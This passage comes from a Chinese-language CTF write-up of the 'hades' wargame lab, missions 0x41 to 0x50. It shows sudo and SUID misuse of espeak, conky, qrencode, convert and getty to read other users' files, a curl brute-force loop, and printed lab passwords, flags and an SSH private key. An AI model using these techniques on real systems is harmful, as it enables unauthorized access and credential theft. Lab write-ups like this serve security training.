  libavformat    <span class="token number">59</span>. <span class="token number">27.100</span> / <span class="token number">59</span>. <span class="token number">27.100</span>
  libavdevice    <span class="token number">59</span>.  <span class="token number">7.100</span> / <span class="token number">59</span>.  <span class="token number">7.100</span>
  libavfilter     <span class="token number">8</span>. <span class="token number">44.100</span> /  <span class="token number">8</span>. <span class="token number">44.100</span>
  libswscale      <span class="token number">6</span>.  <span class="token number">7.100</span> /  <span class="token number">6</span>.  <span class="token number">7.100</span>
  libswresample   <span class="token number">4</span>.  <span class="token number">7.100</span> /  <span class="token number">4</span>.  <span class="token number">7.100</span>
  libpostproc    <span class="token number">56</span>.  <span class="token number">6.100</span> / <span class="token number">56</span>.  <span class="token number">6.100</span>
<span class="token punctuation">[</span>concat @ 0x5576dfdaee00<span class="token punctuation">]</span> Line <span class="token number">1</span>: unknown keyword <span class="token string">'NODEVILINHELL'</span>
/etc/led: Invalid data found when processing input </code></pre>
<p>密码<code>NODEVILINHELL</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">leda@hades:~$ <span class="token function">cat</span> flagz.txt 
^wHseqgzsZUNyruSnxnl^</code></pre>
<h2 id="MISSION-0x41"><a href="#MISSION-0x41" class="headerlink" title="MISSION 0x41"></a>MISSION 0x41</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">################</span>
<span class="token comment"># MISSION 0x41 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User maia hears everything. 

<span class="token comment">## ES ##</span>
La usuaria maia lo oye todo.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">leda@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> leda on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User leda may run the following commands on hades:
    <span class="token punctuation">(</span>maia<span class="token punctuation">)</span> NOPASSWD: /usr/bin/espeak</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">leda@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> maia espeak <span class="token parameter variable">-qXf</span> /etc/maia.txt
Translate <span class="token string">'givemeanewmind'</span>
 <span class="token number">22</span>     g <span class="token punctuation">(</span>i     <span class="token punctuation">[</span>dZ<span class="token punctuation">]</span>
  <span class="token number">1</span>     g        <span class="token punctuation">[</span>g<span class="token punctuation">]</span>
 <span class="token number">46</span>     g <span class="token punctuation">(</span>ive   <span class="token punctuation">[</span>g<span class="token punctuation">]</span>

 <span class="token number">82</span>     _g<span class="token punctuation">)</span> iv <span class="token punctuation">(</span>e <span class="token punctuation">[</span>Iv<span class="token punctuation">]</span>
 <span class="token number">57</span>     iv <span class="token punctuation">(</span>e<span class="token comment">#   [aIv]</span>
  <span class="token number">1</span>     i        <span class="token punctuation">[</span>I<span class="token punctuation">]</span>
 <span class="token number">36</span>     i <span class="token punctuation">(</span>Be<span class="token comment">#   [aI]</span>

  <span class="token number">1</span>     e        <span class="token punctuation">[</span>E<span class="token punctuation">]</span>

  <span class="token number">1</span>     m        <span class="token punctuation">[</span>m<span class="token punctuation">]</span>

 <span class="token number">36</span>     ea       <span class="token punctuation">[</span>i:<span class="token punctuation">]</span>
  <span class="token number">1</span>     e        <span class="token punctuation">[</span>E<span class="token punctuation">]</span>

  <span class="token number">1</span>     n        <span class="token punctuation">[</span>n<span class="token punctuation">]</span>

 <span class="token number">22</span>     ew       <span class="token punctuation">[</span>ju:<span class="token punctuation">]</span>
  <span class="token number">1</span>     e        <span class="token punctuation">[</span>E<span class="token punctuation">]</span>

  <span class="token number">1</span>     m        <span class="token punctuation">[</span>m<span class="token punctuation">]</span>

 <span class="token number">78</span>     m<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token punctuation">(</span>d <span class="token punctuation">[</span>aIn<span class="token punctuation">]</span>
  <span class="token number">1</span>     i        <span class="token punctuation">[</span>I<span class="token punctuation">]</span>

  <span class="token number">1</span>     d        <span class="token punctuation">[</span>d<span class="token punctuation">]</span>

 g'IvI2m,i:nju:m,aInd</code></pre>
<p>givemeanewmind换成大写登录上去<code>GIVEMEANEWMIND</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">maia@hades:~$ <span class="token function">cat</span> flagz.txt 
^GWsDBTCiXdZDNtRzVGt^</code></pre>
<h2 id="MISSION-0x42"><a href="#MISSION-0x42" class="headerlink" title="MISSION 0x42"></a>MISSION 0x42</h2><pre class="language-bash" data-language="bash"><code class="language-bash">maia@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x42 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
It seems that user nephele has broken the image.

<span class="token comment">## ES ##</span>
Parece que la usuaria nephele ha roto la imagen.</code></pre>
<p>修复一下png文件头<br><img src="https://ooo.0x0.ooo/2024/07/06/OPLCH1.png" alt="OPLCH1.png" loading="lazy"><br>拿到密码<code>rZtaitCxlEIRxBayVpgZ</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">nephele@hades:~$ <span class="token function">cat</span> flagz.txt 
^oSiWofNrDjNWbcAqMAx^</code></pre>
<h2 id="MISSION-0x43"><a href="#MISSION-0x43" class="headerlink" title="MISSION 0x43"></a>MISSION 0x43</h2><pre class="language-bash" data-language="bash"><code class="language-bash">nephele@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x43 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The nyx user visits some websites that we <span class="token keyword">do</span> not know.

<span class="token comment">## ES ##</span>
La usuaria nyx visita algunas webs que no conocemos.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">nephele@hades:~$ <span class="token function">cat</span> /etc/hosts
<span class="token number">127.0</span>.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
<span class="token number">172.66</span>.0.66     hades
<span class="token number">127.0</span>.0.1       hades.hmv 
<span class="token number">127.0</span>.0.1       whatsmypass.hmv 
nephele@hades:~$ <span class="token function">curl</span> http://whatsmypass.hmv
HXisrOPSdTcSSTEyyaLn</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">nyx@hades:~$ <span class="token function">cat</span> flagz.txt 
^BdYvJtfaTyfaliZPBkG^</code></pre>
<h2 id="MISSION-0x44"><a href="#MISSION-0x44" class="headerlink" title="MISSION 0x44"></a>MISSION 0x44</h2><pre class="language-bash" data-language="bash"><code class="language-bash">nyx@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x44 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User pallas has her desktop tuned with conky.

<span class="token comment">## ES ##</span>
La usuaria pallas tiene <span class="token function">su</span> desktop tuneado con conky.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">nyx@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> nyx on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User nyx may run the following commands on hades:
    <span class="token punctuation">(</span>pallas<span class="token punctuation">)</span> NOPASSWD: /usr/bin/conky</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">nyx@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> pallas conky <span class="token parameter variable">-h</span>
Usage: conky <span class="token punctuation">[</span>OPTION<span class="token punctuation">]</span><span class="token punctuation">..</span>.
conky is a system monitor that renders text on desktop or to own transparent
window. Command line options will override configurations defined <span class="token keyword">in</span> config
file.
   -v, <span class="token parameter variable">--version</span>             version
   -q, <span class="token parameter variable">--quiet</span>               quiet mode
   -D, <span class="token parameter variable">--debug</span>               increase debugging output, ie. <span class="token parameter variable">-DD</span> <span class="token keyword">for</span> <span class="token function">more</span> debugging
   -c, <span class="token parameter variable">--config</span><span class="token operator">=</span>FILE         config <span class="token function">file</span> to load
   -C, --print-config        print the <span class="token builtin class-name">builtin</span> default config to stdout
                             e.g. <span class="token string">'conky -C > ~/.conkyrc'</span> will create a new default config
   -d, <span class="token parameter variable">--daemonize</span>           daemonize, fork to background
   -h, <span class="token parameter variable">--help</span>                <span class="token builtin class-name">help</span>
   -a, <span class="token parameter variable">--alignment</span><span class="token operator">=</span>ALIGNMENT text alignment on screen, <span class="token punctuation">&#123;</span>top,bottom,middle<span class="token punctuation">&#125;</span>_<span class="token punctuation">&#123;</span>left,right,middle<span class="token punctuation">&#125;</span>
   -X, <span class="token parameter variable">--display</span><span class="token operator">=</span><span class="token environment constant">DISPLAY</span>     X11 display to use
   -m, --xinerama-head<span class="token operator">=</span>N     Xinerama monitor index <span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">=</span>first<span class="token punctuation">)</span>
   -f, <span class="token parameter variable">--font</span><span class="token operator">=</span>FONT           font to use
   -o, --own-window          create own window to draw
   -b, --double-buffer       double buffer <span class="token punctuation">(</span>prevents flickering<span class="token punctuation">)</span>
   -w, --window-id<span class="token operator">=</span>WIN_ID    window <span class="token function">id</span> to draw
   <span class="token parameter variable">-x</span> X                      x position
   <span class="token parameter variable">-y</span> Y                      y position
   -t, <span class="token parameter variable">--text</span><span class="token operator">=</span>TEXT           text to render, remember single quotes, like <span class="token parameter variable">-t</span> <span class="token string">'$uptime'</span>
   -u, <span class="token parameter variable">--interval</span><span class="token operator">=</span>SECS       update interval
   <span class="token parameter variable">-i</span> COUNT                  number of <span class="token builtin class-name">times</span> to update conky <span class="token punctuation">(</span>and quit<span class="token punctuation">)</span>
   -p, <span class="token parameter variable">--pause</span><span class="token operator">=</span>SECS          pause <span class="token keyword">for</span> SECS seconds at startup before doing anything</code></pre>
<p>可以读取配置文件，上一题我搜到一个tmp下面的44题的配置文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">/var/tmp/conky.conf
/var/tmp/temp.conf
/var/tmp/abc.conf
/var/tmp/44conky.conf</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">nyx@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> pallas conky <span class="token parameter variable">-c</span>  /var/tmp/44conky.conf
conky: drawing to single buffer
conky: invalid setting of <span class="token builtin class-name">type</span> <span class="token string">'table'</span>
Info:                                 
Uptime: 43d 18h 46m
Frequency <span class="token punctuation">(</span>in MHz<span class="token punctuation">)</span>: <span class="token number">2397</span>
Frequency <span class="token punctuation">(</span>in GHz<span class="token punctuation">)</span>: <span class="token number">2.40</span>
RAM Usage: 887MiB/1.94GiB - <span class="token number">44</span>% <span class="token comment">####......</span>
Swap Usage: 0B/0B - <span class="token number">0</span>% <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
CPU Usage: <span class="token number">3</span>% <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
Processes: <span class="token number">35</span>  Running: <span class="token number">0</span>
File systems:
 / <span class="token number">8</span>.07GiB/18.8GiB <span class="token comment">####......</span>
Networking:
Up: 0B  - Down: 0B
Name              PID     CPU%   MEM%
 php-fpm8.2       <span class="token number">3697840</span>   <span class="token number">0.00</span>   <span class="token number">0.59</span>
 php-fpm8.2       <span class="token number">3697839</span>   <span class="token number">0.00</span>   <span class="token number">0.53</span>
 php-fpm8.2       <span class="token number">3697838</span>   <span class="token number">0.00</span>   <span class="token number">0.60</span>
 inspircd         <span class="token number">1033494</span>   <span class="token number">0.00</span>   <span class="token number">0.05</span>
^irzKewMCfnhnIMTCJlW^</code></pre>
<p>拿到flag，找不到密码，那就交flag，看官网的密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">pallas/wWxyXnNbmjxNMEAIjbjT</code></pre>
<h2 id="MISSION-0x45"><a href="#MISSION-0x45" class="headerlink" title="MISSION 0x45"></a>MISSION 0x45</h2><pre class="language-bash" data-language="bash"><code class="language-bash">pallas@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x45 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User pandora likes squares.

<span class="token comment">## ES ##</span>
A la usuaria pandora le gustan los cuadrados.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">pallas@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> pallas on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User pallas may run the following commands on hades:
    <span class="token punctuation">(</span>pandora<span class="token punctuation">)</span> NOPASSWD: /usr/bin/qrencode</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">pallas@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> pandora qrencode <span class="token parameter variable">-h</span>
qrencode version <span class="token number">4.1</span>.1
Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2006</span>-2017 Kentaro Fukuchi
Usage: qrencode <span class="token punctuation">[</span>-o FILENAME<span class="token punctuation">]</span> <span class="token punctuation">[</span>OPTION<span class="token punctuation">]</span><span class="token punctuation">..</span>. <span class="token punctuation">[</span>STRING<span class="token punctuation">]</span>
Encode input data <span class="token keyword">in</span> a QR Code and save as a PNG or EPS image.

  <span class="token parameter variable">-h</span>           display this message.
  <span class="token parameter variable">--help</span>       display the usage of long options.
  <span class="token parameter variable">-o</span> FILENAME  <span class="token function">write</span> image to FILENAME. If <span class="token string">'-'</span> is specified, the result
               will be output to standard output. If <span class="token parameter variable">-S</span> is given, structured
               symbols are written to FILENAME-01.png, FILENAME-02.png, <span class="token punctuation">..</span>.
               <span class="token punctuation">(</span>suffix is removed from FILENAME, <span class="token keyword">if</span> specified<span class="token punctuation">)</span>
  <span class="token parameter variable">-r</span> FILENAME  <span class="token builtin class-name">read</span> input data from FILENAME.
  <span class="token parameter variable">-s</span> NUMBER    specify module size <span class="token keyword">in</span> dots <span class="token punctuation">(</span>pixels<span class="token punctuation">)</span>. <span class="token punctuation">(</span>default<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
  <span class="token parameter variable">-l</span> <span class="token punctuation">&#123;</span>LMQH<span class="token punctuation">&#125;</span>    specify error correction level from L <span class="token punctuation">(</span>lowest<span class="token punctuation">)</span> to H <span class="token punctuation">(</span>highest<span class="token punctuation">)</span>.
               <span class="token punctuation">(</span>default<span class="token operator">=</span>L<span class="token punctuation">)</span>
  <span class="token parameter variable">-v</span> NUMBER    specify the minimum version of the symbol. <span class="token punctuation">(</span>default<span class="token operator">=</span>auto<span class="token punctuation">)</span>
  <span class="token parameter variable">-m</span> NUMBER    specify the width of the margins. <span class="token punctuation">(</span>default<span class="token operator">=</span><span class="token number">4</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token keyword">for</span> Micro<span class="token punctuation">))</span>
  <span class="token parameter variable">-d</span> NUMBER    specify the DPI of the generated PNG. <span class="token punctuation">(</span>default<span class="token operator">=</span><span class="token number">72</span><span class="token punctuation">)</span>
  <span class="token parameter variable">-t</span> <span class="token punctuation">&#123;</span>PNG,PNG32,EPS,SVG,XPM,ANSI,ANSI256,ASCII,ASCIIi,UTF8,UTF8i,ANSIUTF8,ANSIUTF8i,ANSI256UTF8<span class="token punctuation">&#125;</span>
               specify the <span class="token builtin class-name">type</span> of the generated image. <span class="token punctuation">(</span>default<span class="token operator">=</span>PNG<span class="token punctuation">)</span>
  <span class="token parameter variable">-S</span>           <span class="token function">make</span> structured symbols. Version number must be specified with <span class="token string">'-v'</span><span class="token builtin class-name">.</span>
  <span class="token parameter variable">-k</span>           assume that the input text contains kanji <span class="token punctuation">(</span>shift-jis<span class="token punctuation">)</span>.
  <span class="token parameter variable">-c</span>           encode lower-case alphabet characters <span class="token keyword">in</span> <span class="token number">8</span>-bit mode. <span class="token punctuation">(</span>default<span class="token punctuation">)</span>
  <span class="token parameter variable">-i</span>           ignore <span class="token keyword">case</span> distinctions and use only upper-case characters.
  <span class="token parameter variable">-8</span>           encode entire data <span class="token keyword">in</span> <span class="token number">8</span>-bit mode. -k, <span class="token parameter variable">-c</span> and <span class="token parameter variable">-i</span> will be ignored.
  <span class="token parameter variable">-M</span>           encode <span class="token keyword">in</span> a Micro QR Code.
  <span class="token parameter variable">-V</span>           display the version number and copyrights of the qrencode.
  <span class="token punctuation">[</span>STRING<span class="token punctuation">]</span>     input data. If it is not specified, data will be taken from
               standard input.

  Try <span class="token string">"qrencode --help"</span> <span class="token keyword">for</span> <span class="token function">more</span> options.</code></pre>
<p>可以读取文件转化成二维码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">pallas@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> pandora qrencode <span class="token parameter variable">-r</span> /pwned/pandora/flagz.txt <span class="token parameter variable">-o</span> /var/tmp/452</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/06/OPEOxD.png" alt="OPEOxD.png" loading="lazy"><br>拿到第45题flag<code>^pjDuPNQVgyhgigOIiwm^</code>，去官网拿下密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">pandora/HhVHfmbBIiZbZSgcgadh</code></pre>
<h2 id="MISSION-0x46"><a href="#MISSION-0x46" class="headerlink" title="MISSION 0x46"></a>MISSION 0x46</h2><pre class="language-bash" data-language="bash"><code class="language-bash">pandora@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x46 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User penelope lets us <span class="token keyword">do</span> something<span class="token punctuation">..</span>.

<span class="token comment">## ES ##</span>
La usuaria penelope nos permite hacer algo<span class="token punctuation">..</span>.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">pandora@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-user</span> penelope <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> proc
/dev/mqueue/linpeas.txt28556
/usr/bin/getty
/var/tmp/fibi
/var/tmp/fibi/pass.txt
/var/tmp/fibi/s.sh
/etc/pene.conf</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">pandora@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /usr/bin/getty
-rwsr-sr-x <span class="token number">1</span> penelope pandora <span class="token number">69112</span> Apr  <span class="token number">5</span> 06:36 /usr/bin/getty</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">pandora@hades:~$ getty <span class="token parameter variable">-8</span> - <span class="token parameter variable">--chroot</span> /pwned/penelope --skip-login --issue-file /etc/pene.conf --login-program <span class="token string">'cat /pwned/penelope/*> /tmp/rj/1/ct'</span>

anoRxVKulaoMNKMrddVe</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">penelope@hades:~$ <span class="token function">cat</span> flagz.txt 
^OGaiNcpusBXCHrDZjwN^</code></pre>
<h2 id="MISSION-0x47"><a href="#MISSION-0x47" class="headerlink" title="MISSION 0x47"></a>MISSION 0x47</h2><pre class="language-bash" data-language="bash"><code class="language-bash">penelope@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x47 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
If we give a username <span class="token punctuation">(</span>user<span class="token punctuation">)</span> and password <span class="token punctuation">(</span>password<span class="token punctuation">)</span> at http: //localhost/request.php, user phoebe may give us her password. 

<span class="token comment">## ES ##</span>
Si damos un usuario <span class="token punctuation">(</span>user<span class="token punctuation">)</span> y password <span class="token punctuation">(</span>password<span class="token punctuation">)</span> en http://localhost/request.php puede que phoebe nos de <span class="token function">su</span> password.</code></pre>
<p>这题是真恶心，一开始不知道用户名用哪个，所以都用phoebe，密码用rockyou爆破键值大错特错<br>后来通过get传参，用已知用户名和密码可以跑出来一些结果，多出来三个新密码，但是都对不上号<br>后来看了小白师傅得到的提示，才发现最开始的hacker用户密码给疏忽，于是又跑了一下，跑出来phoebe的密码，服了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token keyword">while</span> <span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span> <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> line
<span class="token keyword">do</span>
  <span class="token assign-left variable">user</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$line</span>"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token parameter variable">-F</span> <span class="token string">'[/: ]'</span> <span class="token string">'&#123;print $3&#125;'</span><span class="token variable">)</span></span>
  <span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token string">"http://localhost/request.php?user=<span class="token variable">$user</span>&amp;password=begood!"</span>
<span class="token keyword">done</span> <span class="token operator">&lt;</span> users.txt</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">penelope@hades:/tmp/taaa$ <span class="token function">sh</span> b.sh

NOTHING.

NOTHING.

NOTHING.

NOTHING.

NOTHING.

FPLwKmmKhcWAwRxiaBDN

NOTHING.

NOTHING.

NOTHING.
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.</code></pre>
<h2 id="MISSION-0x48"><a href="#MISSION-0x48" class="headerlink" title="MISSION 0x48"></a>MISSION 0x48</h2><pre class="language-bash" data-language="bash"><code class="language-bash">phoebe@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x48 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User rhea likes pictures.

<span class="token comment">## ES ##</span>
A la usuaria rhea le gustan las imagenes.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">phoebe@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> phoebe on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User phoebe may run the following commands on hades:
    <span class="token punctuation">(</span>rhea<span class="token punctuation">)</span> NOPASSWD: /usr/bin/convert</code></pre>
<p>是一个convert指令，convert是图像格式转化工具，群里大佬给了个思路，将txt转化成png</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">phoebe@hades:/tmp/taaa$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> rhea /usr/bin/convert TEXT:/pwned/rhea/flagz.txt /var/tmp/qazx.png
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/15/ORBdaU.png" alt="ORBdaU.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">rhea/iKVVfwEDFbBpTnlnKZKr</code></pre>
<h2 id="MISSION49"><a href="#MISSION49" class="headerlink" title="MISSION49"></a>MISSION49</h2><pre class="language-bash" data-language="bash"><code class="language-bash">rhea@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x49 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User selene wants to tell us something<span class="token punctuation">..</span>.

<span class="token comment">## ES ##</span>
La usuaria selene nos quiere decir algo<span class="token punctuation">..</span>.</code></pre>
<p>用户目录有个流量包,可以分离出来个ssh私钥，直接登录就行了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> id_rsa            
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA6m8jc3NEzQBue8NzNmhxHNVfgCmx+EumEFhq0amDaepnME4N8DWC
O/tHCAh8np089DlUDHpe/8T06muybeN02U8ULr1HJGl03q4nAcHi+tA82ES3MJaWu97BmS
qsEWxDZvYVgySjsG7bbEPE/OuYlWDXfj9QSnD4QNccrt9BmFp3HLGdDt+bbkuQZ6ElN1Qd
m9PFN9GYfM3g0/sM68jtw2XHO7KWKucaod1BOERknGxaM3FqHl+6Rpk3piQthoC+Nuqe5f
jm3rgu4sqXLAd7iFf+NBKDfTmfzwxxH/bIR/Cl1mJwHcC75IceW5OC2wtu938JflO6VFcT
58a0S+GcZwAAA8iJKHc6iSh3OgAAAAdzc2gtcnNhAAABAQDqbyNzc0TNAG57w3M2aHEc1V
+AKbH4S6YQWGrRqYNp6mcwTg3wNYI7+0cICHyenTz0OVQMel7/xPTqa7Jt43TZTxQuvUck
aXTericBweL60DzYRLcwlpa73sGZKqwRbENm9hWDJKOwbttsQ8T865iVYNd+P1BKcPhA1x
yu30GYWnccsZ0O35tuS5BnoSU3VB2b08U30Zh8zeDT+wzryO3DZcc7spYq5xqh3UE4RGSc
bFozcWoeX7pGmTemJC2GgL426p7l+ObeuC7iypcsB3uIV/40EoN9OZ/PDHEf9shH8KXWYn
AdwLvkhx5bk4LbC273fwl+U7pUVxPnxrRL4ZxnAAAAAwEAAQAAAQAVYlHfhBIwiOuLCocF
3X0D3kq5zBPZzDy3nPkRat772E/VTiljUd4xTnhqOSv04+7dcCVEhh0IQ5T7lRtPfsH32I
jEwqssnRn1/fi85kyoCDqkl5AGNJZHSMhsCkJrzG5Rg/zuW3c67sHBHGVplKv0ZEMD1w6h
27ApafXJ1b+L//fHjLbq+HVdrRTF2XmVXSgWj2NpjhdRUzfrcSNz+QgBnltzaY8YJYTsOD
jcLClwnOgCpWS+YghzQUDMr+uoIeSGNTM08q2Y+cPKUPNJ4+J/cA1vDsZiA79jxSrEdII4
BJ9GPbOHempz07SN7hy46Z5cpLuSN0xmTkbkzftSvQShAAAAgQDV42e8bUweH17x+NLduU
CrfIEJmwaJ8xaER4SizExG6R2aGyqXlefPVeZDnRtLR70y4NEPCbOVlmlk+t6n0gn3Pjxt
WdPXE5O18uwwSSjs182DcVqB6NWq2SrKLPSDVQIHNjaFVyLhHav7k2sIokAgMx9/oojNBd
qMuXTseyeyjQAAAIEA/quM6uiMpyjTKegVGt/pCeXFKwK3vKQpyY/gwrtJKMbG4tIWCnBC
ah891PHlq/hQbsrw0QIw/xpmh0YnxB8fsYbqhIh6zWXsyx0pIZUqSg7BA1Tx5ZJtWZg6VM
T2vioJQ9tTerPDUDY0b2f69odG0t+S6OP1WxyHJvyoZsLYHh8AAACBAOuoiTnUIRfPLBHA
zLp7cbH/6FG1l+TzKzBrBuUp4i3gg0Sautfh1/JMcc/zl0Pe2SxvCX0c64xEtLMIVn9/ov
hMk1sbuGbpcrY/N99/xk8NZMDXPSlROgOZ5BLdYu7xrHzWRiAZ/2S7rV4dtLK9L3FuCWjZ
SD+hjsg3DNNJISi5AAAADXNtbEBjYXNzYW5kcmEBAgMEBQ<span class="token operator">==</span>
-----END OPENSSH PRIVATE KEY-----</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">selene@hades:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2041</span><span class="token punctuation">(</span>selene<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2041</span><span class="token punctuation">(</span>selene<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2041</span><span class="token punctuation">(</span>selene<span class="token punctuation">)</span> 
selene@hades:~$ <span class="token function">cat</span> flagz.txt
^VgZLrvZyzGYvqegkslh^</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">selene/zZqEimsDlLPqIyqzNyWB</code></pre>
<h2 id="MISSION50"><a href="#MISSION50" class="headerlink" title="MISSION50"></a>MISSION50</h2><pre class="language-bash" data-language="bash"><code class="language-bash">selene@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x50 #</span>
<span class="token comment">################</span>

